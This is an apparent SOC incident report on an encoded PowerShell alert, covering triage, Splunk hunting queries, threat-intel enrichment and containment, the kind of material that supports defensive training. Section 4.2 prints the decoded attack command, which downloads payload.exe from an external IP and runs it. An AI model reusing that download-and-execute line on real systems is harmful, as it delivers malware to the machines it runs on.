# CASE ID: SOC-2026-002  
## Incident Type: Execution + Command & Control  
**Severity:** High  
**Status:** Contained  

---

## 1. Executive Summary

On 03 February 2026, Splunk generated a high-severity alert indicating execution of PowerShell with encoded command parameters on workstation **WIN-CLIENT-03** under account **admin.local**.

Decoded command analysis revealed the download and execution of a remote payload from external IP address **45.88.10.200**.

Endpoint isolation was initiated immediately. No lateral movement or privilege escalation was observed prior to containment.

The incident was escalated to Incident Response for malware validation and retrospective threat hunting.

---

## 2. Alert Metadata

| Field | Value |
|-------|--------|
| Detection Source | Splunk Enterprise + EDR |
| Detection Rule | Encoded PowerShell Execution |
| First Seen | 2026-02-03 09:14:22 UTC |
| Host | WIN-CLIENT-03 |
| User | admin.local |
| Parent Process | explorer.exe |
| Command Line | powershell.exe -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0 |

---

## 3. Initial Triage

- Encoded PowerShell parameter (-enc) detected
- PowerShell spawned from explorer.exe
- Outbound HTTP connection observed within 10 seconds of execution
- File written to user temp directory
- No known IT maintenance activity scheduled

Assessment: High-risk execution behavior consistent with malware delivery.

---

## 4. Technical Investigation

### 4.1 Process Creation Analysis

**SPL Query Used:**
index=wineventlog EventCode=4688 host="WIN-CLIENT-03"
| search New_Process_Name="*powershell.exe*"
| table _time, Account_Name, Parent_Process_Name, Command_Line

Findings:
- Encoded PowerShell command executed
- Parent process: explorer.exe
- User context: admin.local
- Execution timestamp: 09:14:22 UTC

### 4.2 Command Decoding

Decoded Base64 payload

Powershell
Invoke-WebRequest http://45.88.10.200/payload.exe -OutFile C:\Users\admin.local\AppData\Local\Temp\payload.exe
Start-Process payload.exe

### 4.3 Network Activity Verification

index=firewall OR index=network dest_ip="45.88.10.200"
| table _time, src_ip, dest_ip, dest_port

Findings:
- Outbound HTTP connection to 45.88.10.200
- Destination port: 80
- No additional C2 domains contacted

## 5. Threat Intelligence Enrichment

| Intelligence Source | Result |
|---------------------|--------|
| GeoIP | Eastern Europe |
| ASN | Bulletproof Hosting Provider |
| VirusTotal | 15 Vendor Detections |
| Known Malware Association | Confirmed |

Conclusion: Infrastructure associated with known malware campaigns.

---

## 6. MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|--------|----------|----|
| Execution | Command and Scripting Interpreter | T1059 |
| Command & Control | Ingress Tool Transfer | T1105 |

---

## 7. Impact Assessment

- Malware execution attempt: Confirmed
- Lateral movement: Not observed
- Privilege escalation: Not observed
- Persistence: Not detected
- Data exfiltration: Not observed

Risk Rating: **High**

Containment occurred prior to broader compromise.

---

## 8. Response Actions

- Endpoint isolated via EDR
- Malicious file quarantined
- User credentials reset
- Firewall block implemented for 45.88.10.200
- Enterprise-wide threat hunt conducted:


index=wineventlog EventCode=4688 Command_Line="*-enc*"

No additional infected endpoints detected.

---

## 9. Detection Engineering Improvements

Alert on PowerShell usage with -enc flag

Correlate PowerShell execution with outbound HTTP

Monitor file writes to temp directories

Add parent process anomaly detection

---

## 10. Escalation Decision

Escalated to Incident Response for malware reverse engineering and environment-wide validation.

---

## 11. Evidence References

../screenshots/SOC-2026-002-alert.png

../screenshots/SOC-2026-002-process-tree.png

../screenshots/SOC-2026-002-network.png

../screenshots/SOC-2026-002-virustotal.png
